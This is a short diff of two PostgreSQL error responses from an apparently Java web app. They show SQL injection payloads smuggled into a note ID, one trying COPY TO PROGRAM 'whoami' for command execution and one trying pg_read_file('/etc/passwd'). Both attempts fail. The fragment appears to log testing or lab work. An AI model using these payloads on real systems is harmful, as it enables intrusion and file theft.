@@ -1,2 +1,5 @@
 "status": "error", "message":"An error occurred. StatementCallback; bad SQL grammar [DELETE FROM notes WHERE id = 'ebc3f6ab-e03d-47a3-8ea3-d9c2503635c5'; COPY (SELECT '') TO PROGRAM 'whoami'-- ';]; nested exception is org.postgresql.util.PSQLException: ERROR: must be superuser or a member of the pg_execute_server_program role to COPY to or from an external program
   Hint: Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone."}
+
+"status": "error", "message":"An error occurred. StatementCallback; bad SQL grammar [DELETE FROM notes WHERE id = 'dda1b358-776a-409e-b4eb-4622a1b0f384' UNION SELECT pg_read_file('/etc/passwd')--';]; nested exception is org.postgresql.util.PSQLException: ERROR: syntax error at or near "UNION"
+  Position: 69"}
